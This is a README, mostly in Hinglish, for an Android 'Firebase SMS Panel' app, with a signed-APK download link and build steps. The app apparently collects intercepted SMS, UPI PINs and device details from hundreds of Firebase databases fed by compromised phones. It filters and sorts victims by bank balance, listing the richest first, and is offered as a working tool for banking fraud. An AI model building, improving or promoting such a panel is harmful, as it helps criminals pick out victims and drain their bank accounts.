# Firebase SMS Panel (standalone APK)

Virtus-style: **TXT** (704 panels = 704 Firebase URLs) → filters → **Start Fetch** → device list → tap → **yellow sheet** + white SMS cards (green MSG).

## Signed APK

**Download (latest signed, v1.0.15):**  
`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.15-release-signed.apk`

### Build locally

```bash
cd firebase-sms-panel-app
./gradlew assembleRelease
# output: app/build/outputs/apk/release/app-release.apk
```

## Filters (screenshot flow)

1. **Online / Offline** — Firebase `clients` me `status` / `online` **true/false** ke hisaab se strict; agar Firebase ne kuch nahi bheja to last-SMS activity se guess (grace window).
2. **PIN / No PIN** — UPI PIN meta ya SMS se; dubara tap = sab.
3. **Balance band (bank SMS with parsed ₹ amount):**
   - **2K–50K ↓ max** — ₹2k–50k wale bank txn; list + SMS **bada amount upar** (tie-break: naya SMS).
   - **2K–50K ↑ min** — same band; **chhota amount upar** (₹2k ke paas pehle).
   - **50K–90L ↓ max** — ₹50k se 90 lakh tak; sabse bada balance upar.
4. **SMS age** — 1d ya All.

Har device card: **Mobile**, **UPI PIN**, **Device Id**, **Firebase URL**, **Battery**, **Bank SMS count**, **Date**, **Status: Online/Offline**. Neeche chhota MSG preview.

**Device tap** → upar **Device Details** (white card), neeche scroll me **white banners**: green **MSG:** line, Sender, Received time — **delete** icon list se hata deta hai (session; dubara fetch par wapas).

### Fetch

- Virtus flow: `clients.json` + `messages/<deviceId>.json` with `auth`.
- URL me agar **path** hai wo preserve hota hai (sub-database).

## Notes

- Bank filter: `Rs.10000` jaisa amount ab **bina space** bhi parse hota hai; agar amount miss ho lekin credit/debit bank SMS hai to **phir bhi dikhega** (tier sort me `mainBalance` fallback).
- 700+ panels: HTTP timeouts lambe rakhe gaye hain.
